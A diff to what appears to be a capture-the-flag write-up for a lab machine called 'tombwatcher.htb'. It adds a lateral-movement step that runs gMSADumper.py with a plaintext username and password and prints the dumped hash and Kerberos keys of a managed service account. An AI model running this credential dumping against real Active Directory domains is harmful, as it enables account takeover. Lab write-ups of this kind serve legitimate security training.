@@ -305,11 +305,16 @@ Stopped: Thu Sep 24 03:57:20 2026
 ```
 
 ---
-## User Flag
+### Lateral Movement from alfred to ansible_dev$
 
-### Lateral Movement (if applicable)
-
-Steps to move from initial foothold to user access.
+```
+python3 gMSADumper.py -u 'alfred' -p 'basketball' -d 'tombwatcher.htb'             
+Users or groups who can read password for ansible_dev$:
+ > Infrastructure
+ansible_dev$:::3eca34dd13a85db79c03178b7b149621
+ansible_dev$:aes256-cts-hmac-sha1-96:e9e2850abbdbd04b6f09aa9dea6ab0504a9e4e4f98435bc987f1f90d0faaca81
+ansible_dev$:aes128-cts-hmac-sha1-96:f1e40e3681fdae0d4a8eaf0984691157
+```
 
 ---
 ## Privilege Escalation
